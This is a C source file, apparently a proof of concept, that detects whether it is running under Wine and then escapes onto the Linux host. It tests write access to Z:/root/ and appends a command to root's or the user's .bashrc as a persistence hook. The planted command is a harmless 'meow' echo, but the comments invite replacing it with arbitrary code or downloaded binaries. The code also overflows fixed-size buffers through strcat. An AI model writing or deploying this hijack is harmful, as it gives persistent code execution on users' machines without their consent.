#include <windows.h>
#include <time.h>

void gen_random(char* s, int l);

int main(int argc, char** argv) {
    static const char *(CDECL *pwine_get_version)(void);
    HMODULE hntdll = GetModuleHandle("ntdll.dll");
    if(!hntdll) return 0;

    pwine_get_version = (const char * (*)(void))GetProcAddress(hntdll, "wine_get_version");
    if(pwine_get_version) {
        // Running on wine.

        //Initial root check : can i write to Z:/root/ ?
        srand(time(NULL));
        char fname[16];
        char e[10] = "Z:/root/.";
        gen_random(fname, 16);
        strcat(e, fname);
        HANDLE f = CreateFileA(e, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        if (f != INVALID_HANDLE_VALUE){
            //I can write to Z:/root/ ! 
            //This doesn't mean I have root permissions.
            //The user could have setup wine so that the drive that points to / is e.g. O: and Z: just points to whatever else. But in most cases it should work.

            //Delete the file
            CloseHandle(f);
            DeleteFileA(e);
            
            //Bashrc hijack time - could also do fish (Z:/root/.config/fish/config.fish)
            HANDLE rootbrc = CreateFileA("Z:/root/.bashrc", FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //OPEN_ALWAYS because root might not have a bashrc
            unsigned int pos = SetFilePointer(rootbrc, 0l, NULL, FILE_END);
            char e[37] = "\necho \"meow meow :3\" >> meowing.txt\n"; //you could put anything in there. 
            DWORD _written = 0;
            WriteFile(rootbrc, e, 37, &_written, NULL);
            CloseHandle(rootbrc);
        } else {
            //Running as user - same as above, but we don't have root perms. 
            char username[256]; //hopefully no one sets an username thats longer than this lol (i am compiling this on linux and can't include the necessary header)
            DWORD len = 256;
            GetUserName(username, &len);
            char p[9] = "Z:/home/";
            strcat(p, username);
            strcat(p, "/.bashrc");
            //User bashrc hijack time. Because we're not in root we can't do a lot, but we could still do stuff like downloading binaries to put in ~/.local/bin 
            //More terrible ideas in readme
            HANDLE userbrc = CreateFileA(p, FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
            if (userbrc == INVALID_HANDLE_VALUE){
                //Unlike root, here we use OPEN_EXISTING. This is because most distros provide a default bashrc to their user (unless not using bash).
                //If the file doesn't exist, then the user we got via GetUserName does not exist in /home - this could happen if the user ran `USER="whatever" wine file.exe`
                //It could also happen if Z: is not /
                //Solution 1: check C:/Users (as, if the user ran wine without USER= previously, the actual user will be in there) (beware of steamuser for proton prefixes)
                //Solution 2: loop through folders in Z:/home/ (if exists)
                return 0;
            }
            unsigned int pos = SetFilePointer(userbrc, 0l, NULL, FILE_END);
            char e[37] = "\necho \"meow meow :3\" >> meowing.txt\n";
            DWORD _written = 0;
            WriteFile(userbrc, e, 37, &_written, NULL);
            CloseHandle(userbrc);
        }
    }
    return 0;
}



//Thanks, https://stackoverflow.com/a/45249531/ !
//I couldve wrote smth bigger but cba so this works
void gen_random(char *s, int l) {
    for (int c; c=rand()%62, *s++ = (c+"07="[(c+16)/26])*(l-->0););
}